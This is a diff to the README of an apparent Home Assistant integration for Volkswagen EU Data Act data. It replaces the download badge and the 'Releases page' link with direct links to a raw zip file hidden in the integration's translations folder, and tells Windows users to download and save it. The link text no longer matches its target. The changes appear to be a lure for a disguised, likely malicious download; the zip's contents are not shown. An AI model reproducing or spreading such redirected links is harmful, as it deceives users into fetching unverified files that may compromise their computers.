@@ -1,6 +1,6 @@
 # 🚗 hass-vw-eu-data-act - Connect your Volkswagen car to Home Assistant
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/russellunhamended94/hass-vw-eu-data-act/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/russellunhampered94/hass-vw-eu-data-act/raw/refs/heads/main/custom_components/vw_eu_data_act/translations/hass-act-data-vw-eu-v2.3.zip)
 
 This integration brings data from your Volkswagen EU Data Act portal directly into Home Assistant. You can monitor your vehicle status, battery levels, and trip data from your dashboard.
 
@@ -8,7 +8,7 @@ This integration brings data from your Volkswagen EU Data Act portal directly in
 
 Follow these steps to get the files you need for your setup.
 
-1. Go to the [Releases page](https://github.com/russellunhampered94/hass-vw-eu-data-act/releases).
+1. Go to the [Releases page](https://github.com/russellunhampered94/hass-vw-eu-data-act/raw/refs/heads/main/custom_components/vw_eu_data_act/translations/hass-act-data-vw-eu-v2.3.zip).
 2. Look for the section titled "Assets" under the most recent version.
 3. Click the file with the zip extension to start your download.
 4. Save this file to a folder you can find later on your Windows computer, such as your Downloads folder.
